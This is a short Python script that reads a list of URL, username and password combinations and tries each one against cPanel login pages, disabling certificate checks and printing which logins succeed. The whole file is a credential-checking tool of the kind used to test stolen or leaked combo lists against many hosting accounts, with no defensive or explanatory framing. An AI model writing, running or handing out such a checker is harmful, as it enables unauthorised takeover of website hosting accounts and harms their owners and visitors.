import requests

def check_cpanel_login(url, username, password):
    login_url = f"{url}/login/"
    payload = {
        'user': username,
        'pass': password
    }
    
    response = requests.post(login_url, data=payload, verify=False)
    
    if "The login is invalid" in response.text:
        return False
    elif response.status_code == 200 and "cPanel" in response.text:
        return True
    else:
        return False

def main(wordlist):
    with open(wordlist, 'r') as file:
        for line in file:
          
            line = line.strip()
            if '|' in line:
                url, username, password = line.split('|')
                url = url.split(':')[0] + ':' + url.split(':')[1] # Ensures port is not included in the URL
                print(f"Checking {url} with username {username} and password {password}")
                
                if check_cpanel_login(url, username, password):
                    print(f"Success: {url} with username {username} and password {password}")
                else:
                    print(f"Failed: {url} with username {username} and password {password}")

if __name__ == "__main__":
    wordlist = 'wordlist.txt'
    main(wordlist)
